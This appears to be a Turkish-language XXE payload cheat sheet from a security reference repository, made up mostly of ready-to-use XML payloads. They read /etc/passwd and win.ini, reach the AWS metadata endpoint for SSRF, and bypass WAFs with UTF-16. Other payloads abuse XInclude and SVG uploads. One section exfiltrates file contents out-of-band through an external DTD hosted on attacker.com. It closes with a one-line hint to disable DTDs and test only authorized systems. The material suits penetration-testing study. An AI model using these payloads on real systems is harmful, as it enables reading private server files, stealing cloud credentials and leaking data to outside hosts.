# 📄 XXE - XML Dış Varlık Enjeksiyonu Başvuru Kılavuzu

[🇬🇧 English](../../README.md)

```
  ██╗  ██╗██╗  ██╗███████╗
  ╚██╗██╔╝╚██╗██╔╝██╔════╝
   ╚███╔╝  ╚███╔╝ █████╗  
   ██╔██╗  ██╔██╗ ██╔══╝  
  ██╔╝ ██╗██╔╝ ██╗███████╗
  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
   XML External Entity Injection
```

---

## 🎯 XXE Nedir?

**XXE (XML External Entity Injection)**, harici varlık (external entity) tanımlarını kısıtlamadan işleyen güvensiz XML ayrıştırıcılarını istismar eden bir güvenlik açığıdır. Saldırganın sunucudaki yerel dosyaları okumasına, iç ağa SSRF istekleri yapmasına ve bazı durumlarda uzaktan komut çalıştırmasına (RCE) olanak tanır.

---

## 💉 Temel Payload'lar

### Yerel Dosya Okuma (Local File Read)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Windows Sistem Dosyalarını Okuma
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

### XXE Üzerinden SSRF
```xml
<!-- AWS Bulut Metaveri Servisi Erişimi -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!-- İç Ağdaki Servise İstek -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/">
]>
<root>&xxe;</root>
```

---

## 🔒 Kör XXE (Blind / Out-of-Band XXE)

Yanıt doğrudan XML içinde dönmüyorsa harici DTD dosyası kullanılarak veri saldırganın sunucusuna sızdırılır:

### Harici DTD Çağrısı
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

**Saldırganın sunucusundaki `evil.dtd` içeriği:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### Hata Tabanlı Sızdırma (Error-Based Exfiltration)
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

---

## 🛡️ Atlatma ve Özel Formatlar

### Base64 Kodlama (PHP Sarmalayıcıları)
PHP tabanlı sunucularda ikili veya özel karakter içeren dosyaları okurken:
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

### UTF-16 ile WAF Atlatma
WAF kuralları genellikle UTF-8 XML girdilerini kontrol eder. XML belgesini UTF-16 olarak kodlamak WAF denetimlerini aşabilir:
```xml
<?xml version="1.0" encoding="UTF-16"?>
```

### XInclude Saldırısı
XML gövdesinin tamamını kontrol edemediğiniz (yalnızca tek bir parametre gönderdiğiniz) durumlarda:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### SVG Dosyaları Üzerinden XXE
Profil resmi veya görsel yükleme alanlarında SVG yüklenmesine izin veriliyorsa:
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="20">&xxe;</text>
</svg>
```

---

## 📊 Hızlı Başvuru Tablosu

| İstismar Türü | Payload Şablonu |
|---------------|-----------------|
| Dosya Okuma | `SYSTEM "file:///etc/passwd"` |
| SSRF | `SYSTEM "http://169.254.169.254/"` |
| Kör (Blind) XXE | Harici DTD + Out-of-Band HTTP İsteği |
| Hata Tabanlı | Geçersiz dosya yolu ile hata mesajında veri ifşası |

### Zafiyete Açık Yaygın Noktalar
```
- SOAP Web Servisleri
- XML dosya içe aktarma / yükleme alanları
- SVG görsel işleyicileri
- Ofis doküman ayrıştırıcıları (DOCX, XLSX - aslında birer ZIP/XML arşividir)
- RSS / Atom besleme okuyucuları
```

---

<p align="center">
  <b>📄 XXE Açıklarını Engelleyin: DTD ve Harici Varlıkları Devre Dışı Bırakın!</b><br>
  <i>Yalnızca izin verilen sistemlerde test yapınız.</i>
</p>
